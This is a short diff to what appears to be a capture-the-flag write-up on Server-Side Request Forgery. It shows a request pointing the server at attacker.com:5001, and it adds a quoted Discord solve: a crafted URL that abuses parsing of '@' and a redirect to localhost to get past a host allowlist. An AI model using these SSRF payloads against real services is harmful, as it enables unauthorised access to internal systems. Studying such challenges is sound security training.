@@ -344,3 +344,11 @@ To solve this CTF challenge, you need to exploit Server-Side Request Forgery (SS
 GET /api?url=http://attacker.com:5001/ HTTP/1.1
 Host: flask-app.com
 ```
+
+P.S. @bensonby provides a simple solution on Discord:
+
+```
+my (unintended?) solve for janus:
+
+https://janus.secso.cc/api?url=https://your_own_website.redirecting.tolocalhost5001\@images-api.nasa.gov
+```
